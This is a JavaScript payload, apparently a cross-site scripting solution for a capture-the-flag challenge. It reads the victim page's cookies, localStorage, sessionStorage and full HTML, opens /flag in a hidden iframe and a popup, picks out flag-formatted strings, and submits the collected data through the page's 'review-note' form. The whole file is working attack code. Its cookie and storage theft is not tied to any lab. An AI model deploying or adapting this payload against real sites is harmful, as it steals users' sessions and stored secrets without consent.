(() => {
  const start = () => {
    const form = document.getElementById('review-note');
    if (!form) return;

    const collect = (extra = '') => {
      const text = document.body ? document.body.innerText : '';
      const html = document.documentElement.innerHTML;
      const storage = [
        ...Object.entries(localStorage),
        ...Object.entries(sessionStorage),
      ];
      return [document.cookie, JSON.stringify(storage), text, html, extra].join('\n');
    };

    let sent = false;
    const send = (extra = '') => {
      if (sent) return;
      const all = collect(extra);
      const match = all.match(/(?:firebird|flag|ctf)\{[^}]+\}/i);
      if (!match && !extra.startsWith('payload-ran')) return;
      sent = true;
      form.elements.namedItem('note').value = (match ? match[0] : all).slice(0, 6000);
      form.submit();
    };

    send('');
    if (sent) return;

    const frame = document.createElement('iframe');
    frame.hidden = true;
    frame.src = '/flag';
    frame.addEventListener('load', () => {
      try {
        const extra = `${frame.contentDocument.body?.innerText || ''}\n${frame.contentDocument.documentElement.innerHTML}`;
        send(extra);
      } catch {}
    });
    document.body.appendChild(frame);

    let popup = null;
    try {
      popup = window.open('/flag', 'firebird_flag');
    } catch {}

    let attempts = 0;
    const timer = setInterval(() => {
      attempts += 1;
      try {
        if (popup && popup.document && popup.document.readyState === 'complete') {
          const extra = `${popup.document.body?.innerText || ''}\n${popup.document.documentElement.innerHTML}`;
          popup.close();
          send(extra);
        }
      } catch {}
      if (sent || attempts >= 30) {
        clearInterval(timer);
        if (!sent) send(`payload-ran popup=${Boolean(popup)} frame=${Boolean(frame.contentDocument)}`);
      }
    }, 100);
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', start, { once: true });
  } else {
    start();
  }
})();
